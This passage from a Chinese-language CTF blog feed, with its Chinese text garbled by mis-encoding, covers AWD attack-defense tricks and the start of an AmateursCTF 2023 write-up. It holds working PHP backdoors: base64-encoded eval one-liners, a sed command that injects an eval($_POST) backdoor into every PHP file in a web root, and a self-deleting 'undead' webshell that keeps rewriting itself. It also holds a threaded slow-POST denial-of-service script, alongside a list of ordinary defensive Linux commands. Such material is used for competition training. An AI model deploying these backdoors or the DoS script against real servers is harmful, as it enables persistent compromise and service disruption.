($paths as $path) &#123;                        @file_put_contents($path.&quot;&#x2F;.config.php&quot;,file_get_contents(self()));                        @file_put_contents($path.&quot;&#x2F;-config.php&quot;,file_get_contents(self()));                &#125;        &#125;&#125;#&#125;*&#x2F;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload‚Äî&gt;POST</p><p><strong>m&#x3D;czy&amp;pass&#x3D;ag@ctf</strong></p><p>Ëøô‰∏™‰πüÈúÄË¶ÅÂú®ÊâæÂà∞ÂØπÊñπÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥ûÂêéË¶Å‰∏ä‰º†ÁöÑphpÊñá‰ª∂„ÄÇÁÑ∂ÂêéÂú®ÂØπÊñπÁöÑÁΩëÁ´ô‰∏äËÆøÈóÆËØ•Êñá‰ª∂ÂêéÂ∞±ÁîüÊàê‰∫Ü‰∏çÊ≠ªÈ©¨</p><h3 id="base64Âä†ÂØÜÁöÑ‰∏ÄÂè•ËØùÊú®È©¨"><a href="#base64Âä†ÂØÜÁöÑ‰∏ÄÂè•ËØùÊú®È©¨" class="headerlink" title="base64Âä†ÂØÜÁöÑ‰∏ÄÂè•ËØùÊú®È©¨"></a>base64Âä†ÂØÜÁöÑ‰∏ÄÂè•ËØùÊú®È©¨</h3><blockquote><p>system(‚Äòecho PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2N0ZiddKTsgPz4&#x3D;|base64 -d&gt;&gt;.513.php‚Äô);</p><p>payload:post</p><p>ctf&#x3D;***</p></blockquote><h3 id="ÊØè‰∏Ä‰∏™PHPÊñá‰ª∂Âä†ÂÖ•Êú®È©¨"><a href="#ÊØè‰∏Ä‰∏™PHPÊñá‰ª∂Âä†ÂÖ•Êú®È©¨" class="headerlink" title="ÊØè‰∏Ä‰∏™PHPÊñá‰ª∂Âä†ÂÖ•Êú®È©¨"></a>ÊØè‰∏Ä‰∏™PHPÊñá‰ª∂Âä†ÂÖ•Êú®È©¨</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> /var/www/html/ <span class="token parameter variable">-path</span> /var/www/html/513666 <span class="token parameter variable">-prune</span> <span class="token parameter variable">-o</span>  <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> <span class="token string">'*.php'</span><span class="token operator">|</span><span class="token function">xargs</span>  <span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'1i&lt;?php eval(\$_POST[czy]);?>'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="Âä†ÂØÜÈöêËóè‰∏çÊ≠ªÈ©¨"><a href="#Âä†ÂØÜÈöêËóè‰∏çÊ≠ªÈ©¨" class="headerlink" title="Âä†ÂØÜÈöêËóè‰∏çÊ≠ªÈ©¨"></a>Âä†ÂØÜÈöêËóè‰∏çÊ≠ªÈ©¨</h3><blockquote><p>PD9waHAKaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CiAgICBzZXRfdGltZV9saW1pdCgwKTsKICAgIEB1bmxpbmsoX19GSUxFX18pOwogICAgJGZpbGUgPSAnLmN6eS5waHAnOwogICAgJGNvZGUgPSAnPD9waHAgaWYobWQ1KCRfR0VUWyJjenkiXSk9PSIyYzNiM2I1MmViODMzYmE2NjEzNGFhMWIzOTcwYjM5MSIpe0BldmFsKCRfUE9TVFsiY3p5Il0pO30&#x2F;Pic7CiAgICB3aGlsZSAoMSl7CiAgICAgICAgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsJGNvZGUpOwogICAgICAgIHVzbGVlcCg1MDApOwogICAgfQo&#x2F;Pg&#x3D;&#x3D;</p></blockquote><p>ÂëΩ‰ª§ÊâßË°åÔºö</p><blockquote><p>system(‚Äòecho PD9waHAKaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CiAgICBzZXRfdGltZV9saW1pdCgwKTsKICAgIEB1bmxpbmsoX19GSUxFX18pOwogICAgJGZpbGUgPSAnLmN6eS5waHAnOwogICAgJGNvZGUgPSAnPD9waHAgaWYobWQ1KCRfR0VUWyJjenkiXSk9PSIyYzNiM2I1MmViODMzYmE2NjEzNGFhMWIzOTcwYjM5MSIpe0BldmFsKCRfUE9TVFsiY3p5Il0pO30&#x2F;Pic7CiAgICB3aGlsZSAoMSl7CiAgICAgICAgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsJGNvZGUpOwogICAgICAgIHVzbGVlcCg1MDApOwogICAgfQo&#x2F;Pg&#x3D;&#x3D;|base64 -d &gt;.czy.php‚Äô);</p></blockquote><p>ÊòéÊñáÔºö</p><blockquote><?phpignore_user_abort(true);set_time_limit(0);@unlink(__FILE__);$file = '.czy.php';$code = '<?php if(md5($_GET["czy"])=="2c3b3b52eb833ba66134aa1b3970b391"){@eval($_POST["czy"]);}?><p>‚Äò;<br>while (1){<br>  file_put_contents($file,$code);<br>  usleep(500);<br>}<br>?&gt;</p><p>payloadÔºöGET    .czy.php&#x2F;?czy&#x3D;ag@ctf</p><p>‚ÄãPOST    czy&#x3D;phpinfo();</p></blockquote><h2 id="ÊÄªÁªì‰∏Ä‰∏ãÁ∫ø‰∏ãËµõÁöÑÈò≤Êä§Â∑•‰Ωú‰∏≠Â∏∏Áî®ÁöÑ‰∏Ä‰∫õÂëΩ‰ª§"><a href="#ÊÄªÁªì‰∏Ä‰∏ãÁ∫ø‰∏ãËµõÁöÑÈò≤Êä§Â∑•‰Ωú‰∏≠Â∏∏Áî®ÁöÑ‰∏Ä‰∫õÂëΩ‰ª§" class="headerlink" title="ÊÄªÁªì‰∏Ä‰∏ãÁ∫ø‰∏ãËµõÁöÑÈò≤Êä§Â∑•‰Ωú‰∏≠Â∏∏Áî®ÁöÑ‰∏Ä‰∫õÂëΩ‰ª§"></a>ÊÄªÁªì‰∏Ä‰∏ãÁ∫ø‰∏ãËµõÁöÑÈò≤Êä§Â∑•‰Ωú‰∏≠Â∏∏Áî®ÁöÑ‰∏Ä‰∫õÂëΩ‰ª§</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">ssh <span class="token operator">&lt;</span><span class="token operator">-</span>p Á´ØÂè£<span class="token operator">></span> username@ipscp Êñá‰ª∂Ë∑ØÂæÑ  username@ip<span class="token operator">:</span>Â≠òÊîæË∑ØÂæÑcat <span class="token operator">/</span>root<span class="token operator">/</span><span class="token punctuation">.</span>bash_history#ÊòæÁ§∫ÊúÄËøëÁôªÂΩïÁöÑ<span class="token number">5</span>‰∏™Â∏êÂè∑last <span class="token operator">-</span>n <span class="token number">5</span><span class="token operator">|</span>awk <span class="token string">'&#123;print $1&#125;'</span>#ÊòæÁ§∫<span class="token operator">/</span>etc<span class="token operator">/</span>passwdÁöÑË¥¶Êà∑cat <span class="token operator">/</span>etc<span class="token operator">/</span>passwd<span class="token operator">|</span>awk <span class="token operator">-</span><span class="token constant">F</span> <span class="token string">':'</span> <span class="token string">'&#123;print $1&#125;'</span>#Êü•Áúã<span class="token constant">UID</span>‰∏∫<span class="token number">0</span>ÁöÑÂ∏êÂè∑awk <span class="token operator">-</span><span class="token constant">F</span><span class="token operator">:</span> <span class="token string">'&#123;if($3==0)print $1&#125;'</span> <span class="token operator">/</span>etc<span class="token operator">/</span>passwd#Êü•Êâæ<span class="token number">777</span>ÁöÑÊùÉÈôêÁöÑÊñá‰ª∂find <span class="token punctuation">.</span> <span class="token operator">-</span>name <span class="token string">"*.php"</span> <span class="token operator">-</span>perm <span class="token number">4777</span>#Êü•Êâæ<span class="token number">24</span>Â∞èÊó∂ÂÜÖË¢´‰øÆÊîπÁöÑ<span class="token constant">PHP</span>Êñá‰ª∂find <span class="token punctuation">.</span><span class="token operator">/</span> <span class="token operator">-</span>mtime <span class="token number">0</span> <span class="token operator">-</span>name <span class="token string">"*.php"</span>#Êü•ÁúãËøõÁ®ãps aux <span class="token operator">|</span> grep pidÊàñËÄÖËøõÁ®ãÂêç„ÄÄ„ÄÄ„ÄÄ„ÄÄ#Êü•ÁúãÂ∑≤Âª∫Á´ãÁöÑÁΩëÁªúËøûÊé•ÂèäËøõÁ®ãnetstat <span class="token operator">-</span>antulp <span class="token operator">|</span> grep <span class="token constant">EST</span>#Êü•ÁúãÊåáÂÆöÁ´ØÂè£Ë¢´Âì™‰∏™ËøõÁ®ãÂç†Áî®lsof <span class="token operator">-</span>i<span class="token operator">:</span>Á´ØÂè£Âè∑ ÊàñËÄÖ netstat <span class="token operator">-</span>tunlp<span class="token operator">|</span>grep Á´ØÂè£Âè∑#ÁªìÊùüËøõÁ®ãÂëΩ‰ª§kill <span class="token constant">PID</span>killall <span class="token operator">&lt;</span>ËøõÁ®ãÂêç<span class="token operator">></span>pkill <span class="token operator">&lt;</span>ËøõÁ®ãÂêç<span class="token operator">></span>pkill <span class="token operator">-</span>uÁî®Êà∑Âêç#Â∞ÅÊùÄÊüê‰∏™<span class="token constant">IP</span>ÊàñËÄÖipÊÆµiptables <span class="token operator">-</span><span class="token constant">I</span> <span class="token constant">INPUT</span> <span class="token operator">-</span>s source_ip<span class="token punctuation">[</span><span class="token operator">/</span>mask<span class="token punctuation">]</span> <span class="token operator">-</span>j <span class="token constant">DROP</span>#Á¶ÅÊ≠¢‰ªéÊüê‰∏™‰∏ªÊú∫sshËøúÁ®ãËÆøÈóÆÁôªÈôÜÂà∞Êú¨Êú∫iptable <span class="token operator">-</span>t filter <span class="token operator">-</span><span class="token constant">A</span> <span class="token constant">INPUT</span> <span class="token operator">-</span>s source_ip<span class="token punctuation">[</span><span class="token operator">/</span>mask<span class="token punctuation">]</span> <span class="token operator">-</span>p tcp <span class="token operator">--</span>dport <span class="token number">22</span> <span class="token operator">-</span>j <span class="token constant">DROP</span>#Â§á‰ªΩmysqlÊï∞ÊçÆÂ∫ìmysqldump <span class="token operator">-</span>u Áî®Êà∑Âêç <span class="token operator">-</span>p ÂØÜÁ†Å Êï∞ÊçÆÂ∫ìÂêç <span class="token operator">></span> bak<span class="token punctuation">.</span>sqlmysqldump <span class="token operator">--</span>all<span class="token operator">-</span>databases <span class="token operator">></span> bak<span class="token punctuation">.</span>sql#ËøòÂéümysqlÊï∞ÊçÆÂ∫ìmysql <span class="token operator">-</span>u Áî®Êà∑Âêç <span class="token operator">-</span>p ÂØÜÁ†Å Êï∞ÊçÆÂ∫ìÂêç <span class="token operator">&lt;</span> bak<span class="token punctuation">.</span>sql#ÂÆöÊó∂‰ªªÂä°ÔºåÂú®Âõ∫ÂÆöÁöÑÊó∂Èó¥Èó¥ÈöîÊâßË°åÊåáÂÆöÁöÑÁ≥ªÁªüÊåá‰ª§Êàñshell scriptcrontab <span class="token punctuation">[</span><span class="token operator">-</span>u user<span class="token punctuation">]</span> file_namecrontab <span class="token punctuation">[</span><span class="token operator">-</span>u user<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>e <span class="token operator">|</span><span class="token operator">-</span>l<span class="token operator">|</span> <span class="token operator">-</span>r<span class="token punctuation">]</span>#Ê£ÄÊµãÊâÄÊúâÁöÑtcpËøûÊé•Êï∞ÈáèÂèäÁä∂ÊÄÅnetstat <span class="token operator">-</span>ant<span class="token operator">|</span>awk<span class="token operator">|</span>grep<span class="token operator">|</span>sed <span class="token operator">-</span>e <span class="token operator">-</span>e<span class="token operator">|</span>sort<span class="token operator">|</span>uniq <span class="token operator">-</span>c<span class="token operator">|</span>sort <span class="token operator">-</span>rn#Êü•ÁúãÈ°µÈù¢ËÆøÈóÆÊéíÂêçÂâçÂçÅÁöÑ<span class="token constant">IP</span>cat <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>apache2<span class="token operator">/</span>access<span class="token punctuation">.</span>log<span class="token operator">|</span>cut <span class="token operator">-</span>f1 <span class="token operator">-</span>d<span class="token operator">|</span>sort<span class="token operator">|</span>uniq <span class="token operator">-</span>c<span class="token operator">|</span>sort <span class="token operator">-</span>k  <span class="token operator">-</span>r<span class="token operator">|</span>head <span class="token operator">-</span>„ÄÄ„ÄÄ#Êü•ÁúãÈ°µÈù¢ËÆøÈóÆÊéíÂêçÂâçÂçÅÁöÑ<span class="token constant">URL</span>cat <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>apache2<span class="token operator">/</span>access<span class="token punctuation">.</span>log<span class="token operator">|</span>cut <span class="token operator">-</span>f4 <span class="token operator">-</span>d<span class="token operator">|</span>sort<span class="token operator">|</span>uniq <span class="token operator">-</span>c<span class="token operator">|</span>sort <span class="token operator">-</span>k  <span class="token operator">-</span>r<span class="token operator">|</span>head <span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="DOSËÑöÊú¨"><a href="#DOSËÑöÊú¨" class="headerlink" title="DOSËÑöÊú¨"></a>DOSËÑöÊú¨</h2><blockquote><p>ËøôÁßçÊÉÖÂÜµ‰æøÊòØ‰∏çÊÉ≥Áé©‰∫ÜÔºåÁé©‰∏ç‰∏ãÂéª‰∫ÜË¢´ÊîªÈô∑‰∫ÜÔºåÂèØ‰ª•ËØïÁùÄÁªôÂà´‰∫∫‰∏ÄÊ£íÂ≠ê</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> time<span class="token keyword">import</span> threading<span class="token builtin">max</span><span class="token operator">=</span><span class="token number">90000000</span>port<span class="token operator">=</span><span class="token number">80</span>                 <span class="token comment">#Á´ØÂè£</span>host<span class="token operator">=</span><span class="token string">"192.168.92.154"</span>   <span class="token comment">#IP</span>page<span class="token operator">=</span><span class="token string">"/index.php"</span>bag<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"POST %s HTTP/1.1\r\n"</span>    <span class="token string">"host: %s\r\n"</span>    <span class="token string">"Content-Length: 1000000000\r\n"</span>    <span class="token string">"Cookie: 1998\r\n"</span>    <span class="token string">"\r\n"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>page<span class="token punctuation">,</span>host<span class="token punctuation">)</span><span class="token punctuation">)</span>socks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> socks    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">max</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>            s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>bag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            socks<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> ex<span class="token punctuation">:</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> socks    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> s <span class="token keyword">in</span> socks<span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ÊîªÂáª‰∏≠...."</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> ex<span class="token punctuation">:</span>                socks<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>s<span class="token punctuation">)</span>                s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>One <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>connect<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Two <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>send<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>One<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>Two<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Áü•ËØÜÁÇπ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AmateursCTF 2023wp</title>
      <link href="/2023/07/22/AmateursCTF-2023wp/"/>
      <url>/2023/07/22/AmateursCTF-2023wp/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p><img src="https://img-blog.csdnimg.cn/a940c784ee9a4fe2a043298e02b63070.png" alt="1"></p><h2 id="ÂâçË®Ä"><a href="#ÂâçË®Ä" class="headerlink" title="ÂâçË®Ä"></a>ÂâçË®Ä</h2><p>ËôΩÁÑ∂ËØ¥Ëøô‰∏™ÊØîËµõÊòØÈíàÂØπ‰∫éÁæéÂõΩÈ´ò‰∏≠ÁîüÁöÑÔºåÂèØÊòØ‰πü‰∏çÊòØÂæàÁÆÄÂçïÔºåÁæéÂõΩÈ´ò‰∏≠ÁîüËøô‰πàDÂêóÔºåËØ•Âä™Âäõ‰∫Ü :sob:</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="waiting-an-eternity"><a href="#waiting-an-eternity" class="headerlink" title="waiting-an-eternity"></a>waiting-an-eternity</h3><blockquote><p>ÊàëÁöÑÊúãÂèãÁªôÊàëÂèë‰∫ÜËøô‰∏™ÁΩëÁ´ôÔºåÂπ∂ËØ¥Â¶ÇÊûúÊàëÁ≠âÂæóË∂≥Â§üÈïøÔºåÊàëÂ∞±ÂèØ‰ª•ÂæóÂà∞Âπ∂‰∏æÊä•ÔºÅÂπ∂‰∏çÊòØËØ¥ÊàëÈúÄË¶Å‰∏ÄÈù¢ÊóóÂ∏úÊàñ‰ªª‰Ωï‰∏úË•øÔºå‰ΩÜÊàëÂ∑≤ÁªèÁ≠â‰∫ÜÂá†Â§©‰∫ÜÔºåÂÆÉ‰ªçÁÑ∂Ë¶ÅÊ±ÇÊàëÁ≠âÂæÖ„ÄÇÊàëÊúâÁÇπ‰∏çËÄêÁÉ¶‰∫ÜÔºå‰Ω†ËÉΩÂ∏ÆÊàëÊãøÊóóÂ≠êÂêóÔºü</p></blockquote><p>ÊäìÂåÖÂæóÂà∞Á∫øÁ¥¢Ôºö<br><img src="https://img-blog.csdnimg.cn/fe692516b6d34fd1a7d34a9ef06f5ac3.png" alt="1"><br>ËÆøÈóÆÂêéÂèëÁé∞ÊØèÂà∑Êñ∞‰∏ÄÊ¨°&#x3D;&#x3D;set-cookie&#x3D;&#x3D;Â∞±‰ºöÂèò‰∏ÄÊ¨°ÔºåÂÆÉË∑üÊó∂Èó¥‰πüÊúâ‰∏Ä‰∫õÂÖ≥Á≥ª„ÄÇ<br><img src="https://img-blog.csdnimg.cn/d81d9bdd78184662817b7438e9768d5d.png" alt="2"><br>ÈÇ£‰πàÊàë‰ª¨Ê∑ªÂä†‰∏Ä‰∏™cookieÂÄº<br><img src="https://img-blog.csdnimg.cn/4913065b3b7b455ba1e53e5bda386c75.png" alt="3"><br>ÁªèËøáÂá†Ê¨°ÊµãËØïÔºåÂΩìtime‰∏∫Ë¥üÊï∞‰∏îË∂≥Â§üÂ∞èÊó∂Â∞±‰ºöÂá∫Áé∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/4ea4d69f2e8547b49ed15020b7e5b1f0.png" alt="3"><br>ËøôÈáåÊó∂Èó¥ÁöÑË°®Á§∫‰Ω†ÂèØ‰ª•Ê≠£Â∏∏Ë°®Á§∫Ôºå‰πüÂèØ‰ª•‰ΩøÁî®ÁßëÂ≠¶ËÆ°Êï∞Ê≥ïÔºå‰πüÂèØ‰ª•‰ΩøÁî®&#x3D;&#x3D;-inf&#x2F;-Infinity&#x3D;&#x3D;Êù•Ë°®Á§∫Êó†Á©∑Â∞è„ÄÇ</p><h3 id="funny-factorials"><a href="#funny-factorials" class="headerlink" title="funny factorials"></a>funny factorials</h3><blockquote><p>ÊàëÂà∂‰Ωú‰∫Ü‰∏Ä‰∏™Èò∂‰πòÂ∫îÁî®Á®ãÂ∫èÔºÅÂÆÉÊòØÂ¶ÇÊ≠§ÁöÑÂ•áÁâπÂíåËø∑‰∫∫„ÄÇÁÑ∂ËÄåÔºåÈò∂‰πò‰ºº‰πéÊó†Ê≥ïÊ≠£Á°ÆËÆ°ÁÆóÂ§ßÊï∞ÔºÅ‰Ω†ËÉΩÂ∏ÆÊàëËß£ÂÜ≥ÂÆÉÂêóÔºü</p></blockquote><p><img src="https://img-blog.csdnimg.cn/3fdd0c83d0df415aa50ec3172aa80238.png" alt="1"></p><p>ÂàÜÊûêÊï∞ÊçÆÂåÖÂèØ‰ª•ÁåúÊµãÂú®ÂàáÊç¢‰∏ªÈ¢òÁöÑÊï∞ÊçÆÂåÖ‰∏≠ÊúâÁñë‰ººÊñá‰ª∂ËØªÂèñÊºèÊ¥û„ÄÇ<code>/?theme=themes/theme1.css</code>ÔºåÈ¢òÁõÆÁªôÁöÑËøòÊúâÈôÑ‰ª∂<br>app.pyÊñá‰ª∂</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token keyword">import</span> sysapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">factorial</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> n <span class="token operator">*</span> factorial<span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> RecursionError<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">filter_path</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># print(path)</span>    path <span class="token operator">=</span> path<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"../"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> filter_path<span class="token punctuation">(</span>path<span class="token punctuation">)</span>    <span class="token keyword">except</span> RecursionError<span class="token punctuation">:</span>        <span class="token comment"># remove root / from path if it exists</span>        <span class="token keyword">if</span> path<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"/"</span><span class="token punctuation">:</span>            path <span class="token operator">=</span> path<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token keyword">return</span> path<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    safe_theme <span class="token operator">=</span> filter_path<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"theme"</span><span class="token punctuation">,</span> <span class="token string">"themes/theme1.css"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>safe_theme<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>    theme <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> css<span class="token operator">=</span>theme<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">calculate_factorial</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    safe_theme <span class="token operator">=</span> filter_path<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"theme"</span><span class="token punctuation">,</span> <span class="token string">"themes/theme1.css"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>safe_theme<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>    theme <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> num <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>            error <span class="token operator">=</span> <span class="token string">"Invalid input: Please enter a non-negative integer."</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> error<span class="token operator">=</span>error<span class="token punctuation">,</span> css<span class="token operator">=</span>theme<span class="token punctuation">)</span>        result <span class="token operator">=</span> factorial<span class="token punctuation">(</span>num<span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> result<span class="token operator">=</span>result<span class="token punctuation">,</span> css<span class="token operator">=</span>theme<span class="token punctuation">)</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        error <span class="token operator">=</span> <span class="token string">"Invalid input: Please enter a non-negative integer."</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> error<span class="token operator">=</span>error<span class="token punctuation">,</span> css<span class="token operator">=</span>theme<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    sys<span class="token punctuation">.</span>setrecursionlimit<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" 